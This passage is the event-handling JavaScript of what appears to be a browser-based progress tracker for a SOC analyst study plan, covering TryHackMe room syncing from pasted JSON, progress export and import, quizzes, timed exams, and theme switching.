  if (a === 'thmCheck') { el.textContent = 'Checking...'; pollThm(); setTimeout(() => { if (el.isConnected) el.textContent = 'Check now'; }, 1500); return; }
  if (a === 'newsOk') { LIVE.news = []; render(); return; }
  if (a === 'thmPaste') { const msg = $('#thmMsg'); let codes = null;
    try { const j = JSON.parse($('#thmPaste').value.trim()); codes = j.data.docs.map(d => String(d.code)); } catch (e) {}
    if (!codes || !codes.length) { msg.textContent = 'That does not look like the TryHackMe page text. Copy the whole page (Ctrl+A, Ctrl+C) and paste again.'; msg.style.color = 'var(--bad)'; return; }
    const before = THMSET.size; S.thm = { user: (S.thm && S.thm.user) || 'vicuvi1', at: Date.now(), codes: [...new Set([...(S.thm ? S.thm.codes : []), ...codes])] }; refreshThm(); save(); render();
    const m2 = $('#thmMsg'); if (m2) { m2.closest('details').open = true; m2.textContent = 'Synced. ' + (THMSET.size - before) + ' new completed room' + (THMSET.size - before === 1 ? '' : 's') + ' found.'; m2.style.color = 'var(--good)'; } return; }
  if (a === 'exportHtml') return exportHtml();
  if (a === 'exportJson') return download('soc-progress-' + stamp() + '.json', JSON.stringify(S), 'application/json');
  if (a === 'copyCode') { const c = toCode(); try { navigator.clipboard.writeText(c).then(() => moveMsg('Progress code copied. Paste it into "Bring progress in" on the other PC.'), () => { $('#impCode').value = c; $('#impCode').select(); moveMsg('Copy the selected code with Ctrl+C.'); }); } catch (e) { $('#impCode').value = c; $('#impCode').select(); moveMsg('Copy the selected code with Ctrl+C.'); } return; }
  if (a === 'impCode') return offerImport($('#impCode').value);
  if (a === 'impNo') { PENDING = null; return render(); }
  if (a === 'impYes' && PENDING) { S = Object.assign(fresh(), PENDING); adoptThm(D.thm); adoptThm(window.THM_SYNC); refreshThm(); PENDING = null; save(); render(); moveMsg('Progress loaded.'); return; }
  if (a === 'libf') { LIBF = el.dataset.f; render(); return; }
  if (a === 'theme') { const r = document.documentElement, cur = r.dataset.theme || (matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'), nx = cur === 'dark' ? 'light' : 'dark'; r.dataset.theme = nx; try { localStorage.setItem('soc12-theme', nx); } catch (e) {} return; }
  if (a === 'goStep') { const d = document.getElementById('step-' + el.dataset.w + '-' + el.dataset.i); if (d) { d.open = true; d.scrollIntoView({ behavior: 'smooth', block: 'start' }); } return; }
  if (a === 'setStart') { const v = $('#startDate').value; S.start = v ? new Date(v + 'T00:00:00').getTime() : Date.now(); save(); render(); }
  else if (a === 'clearStart') { S.start = null; save(); render(); }
  else if (a === 'reset1') { $('#resetBox').innerHTML = 'Delete all progress? <button class="btn small" data-act="reset2">Yes, delete</button> <button class="btn ghost small" data-act="reset0">Cancel</button>'; }
  else if (a === 'reset0') render();
  else if (a === 'reset2') { S = fresh(); adoptThm(D.thm); adoptThm(window.THM_SYNC); refreshThm(); save(); render(); }
  else if (a === 'startQuiz') startRun(shuffle(weekQids(+el.dataset.w)), 'week', +el.dataset.w);
  else if (a === 'startReview') startRun(dueIds().slice(0, 20), 'review');
  else if (a === 'pick' && QS && QS.picked === null) { const id = QS.ids[QS.i]; QS.picked = +el.dataset.o; const ok = QS.picked === Q[id].a; if (ok) QS.right++; grade(id, ok); bump(1); save(); drawRun(); }
  else if (a === 'nextQ' && QS) { QS.i++; QS.picked = null; drawRun(); }
  else if (a === 'check') checkAnswer(+el.dataset.w, +el.dataset.i);
  else if (a === 'copy') { const t = D.weeks[+el.dataset.w - 1].chal.evidence; const done = () => { el.textContent = 'Copied'; setTimeout(() => el.textContent = 'Copy evidence', 1500); }; const fail = () => { const r = document.createRange(); r.selectNodeContents($('#ev-' + el.dataset.w)); const s = getSelection(); s.removeAllRanges(); s.addRange(r); el.textContent = 'Selected: press Ctrl+C'; }; try { navigator.clipboard.writeText(t).then(done, fail); } catch (e) { fail(); } }
  else if (a === 'startExam') startExam(+el.dataset.s);
  else if (a === 'submitExam') submitExam();
  else if (a === 'closeExam') { ES = null; render(); }
});
document.addEventListener('change', ev => {
  const el = ev.target, a = el.dataset && el.dataset.act;
  if (a === 'task' || a === 'res') { const code = el.dataset.code, m = code ? S.rooms : a === 'task' ? S.tasks : S.res, k = code || el.dataset.k; if (el.checked) { m[k] = 1; bump(a === 'task' ? 3 : 1); } else delete m[k]; save(); const y = window.scrollY; render(); window.scrollTo(0, y); }
  else if (a === 'rec') { if (el.checked) { S.rec[el.dataset.w] = 1; bump(1); } else delete S.rec[el.dataset.w]; save(); const y = window.scrollY; render(); window.scrollTo(0, y); }
  else if (a === 'impFile' && el.files && el.files[0]) { const f = new FileReader(); f.onload = () => offerImport(f.result); f.readAsText(el.files[0]); }
  else if (a === 'ans' && ES && !ES.result) { ES.ans[el.dataset.id] = +el.value; const t = document.querySelector('.timer span'); if (t) t.textContent = Object.keys(ES.ans).length + '/' + ES.ids.length + ' answered'; }
});
document.addEventListener('toggle', ev => { const d = ev.target; if (d.dataset && d.dataset.i !== undefined && d.dataset.w) { (OPEN[d.dataset.w] = OPEN[d.dataset.w] || {})[d.dataset.i] = d.open; } }, true);
document.addEventListener('keydown', ev => { if (ev.key === 'Enter' && ev.target.matches && ev.target.matches('.cq input')) checkAnswer(+ev.target.dataset.w, +ev.target.dataset.i); });

render();
initRemote();
if (window.THM_SYNC) { LIVE.at = window.THM_SYNC.at || 0; LIVE.ok = Date.now() - LIVE.at < 6 * 6e4; LIVE.checked = Date.now(); if (LIVE.ok) render(); }
setInterval(pollThm, 60000);
window.addEventListener('focus', pollThm);
document.addEventListener('visibilitychange', () => { if (!document.hidden) pollThm(); });
</script>
